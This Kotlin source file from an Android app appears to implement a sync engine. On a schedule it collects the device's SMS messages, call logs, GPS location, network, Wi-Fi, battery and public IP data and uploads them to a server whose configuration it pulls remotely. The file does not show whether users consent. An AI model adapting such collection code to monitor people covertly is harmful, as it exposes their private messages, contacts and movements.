package com.samgent.app

import android.content.Context
import org.json.JSONArray
import org.json.JSONObject

object SyncEngine {
    fun pullConfig(prefs: Prefs, api: ApiClient) {
        try {
            val remote = api.getConfig()
            prefs.applyServerConfig(remote)
        } catch (_: Exception) {
            // keep local cache
        }
    }

    fun run(
        context: Context,
        prefs: Prefs,
        forceAll: Boolean = false,
        wifiOnly: JSONArray? = null,
    ): JSONObject {
        val api = ApiClient(prefs)
        pullConfig(prefs, api)

        val now = System.currentTimeMillis()
        val collected = mutableListOf<String>()

        val sms = if (forceAll || prefs.isDue("sms", now)) {
            collected += "sms"
            Collectors.collectSms(context)
        } else {
            JSONArray()
        }
        val calls = if (forceAll || prefs.isDue("calls", now)) {
            collected += "calls"
            Collectors.collectCalls(context)
        } else {
            JSONArray()
        }
        val gps = if (forceAll || prefs.isDue("gps", now)) {
            collected += "gps"
            TelemetryCollectors.collectGps(context)
        } else {
            JSONArray()
        }
        val networkSignal = if (forceAll || prefs.isDue("networkSignal", now)) {
            collected += "networkSignal"
            TelemetryCollectors.collectNetworkSignal(context)
        } else {
            JSONArray()
        }
        val networkType = if (forceAll || prefs.isDue("networkType", now)) {
            collected += "networkType"
            TelemetryCollectors.collectNetworkType(context)
        } else {
            JSONArray()
        }
        val battery = if (forceAll || prefs.isDue("battery", now)) {
            collected += "battery"
            TelemetryCollectors.collectBattery(context)
        } else {
            JSONArray()
        }
        val wifiSignal = if (forceAll || prefs.isDue("wifiSignal", now)) {
            collected += "wifiSignal"
            TelemetryCollectors.collectWifiSignal(context)
        } else {
            JSONArray()
        }
        val wifi = JSONArray()
        for (i in 0 until wifiSignal.length()) wifi.put(wifiSignal.getJSONObject(i))
        if (wifiOnly != null) {
            for (i in 0 until wifiOnly.length()) wifi.put(wifiOnly.getJSONObject(i))
        }
        val publicIp = if (forceAll || prefs.isDue("publicIp", now)) {
            collected += "publicIp"
            TelemetryCollectors.collectPublicIp()
        } else {
            JSONArray()
        }

        val empty =
            sms.length() == 0 &&
                calls.length() == 0 &&
                gps.length() == 0 &&
                networkSignal.length() == 0 &&
                networkType.length() == 0 &&
                battery.length() == 0 &&
                wifi.length() == 0 &&
                publicIp.length() == 0
        if (empty) {
            // Nothing to upload; still mark due kinds so empty checks do not spin.
            stampCollected(prefs, collected, now)
            return JSONObject().put("ok", true).put("skipped", true)
        }

        val result = api.ingest(
            sms = sms,
            calls = calls,
            gps = gps,
            networkSignal = networkSignal,
            networkType = networkType,
            battery = battery,
            wifi = wifi,
            publicIp = publicIp,
        )
        stampCollected(prefs, collected, now)
        return result
    }

    private fun stampCollected(prefs: Prefs, keys: List<String>, now: Long) {
        for (key in keys) {
            prefs.setLastCollectedAt(key, now)
        }
    }
}
